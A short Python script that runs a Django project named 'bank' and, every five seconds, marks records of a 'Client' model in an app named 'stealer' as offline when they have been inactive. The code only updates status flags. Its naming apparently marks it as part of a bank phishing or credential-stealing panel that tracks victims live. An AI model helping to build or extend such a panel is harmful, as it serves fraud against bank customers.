import os
import django

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'bank.settings')
django.setup()


def update_offline_statuses():
    import datetime
    from django.utils.timezone import now
    from stealer.models import Client
    time_activity_limit = now() - datetime.timedelta(seconds=3)
    clients = Client.objects.filter(last_action__lt=time_activity_limit)
    clients.update(is_online=False, is_waiting=False)


import schedule
schedule.every(5).seconds.do(update_offline_statuses)


while True:
    schedule.run_pending()
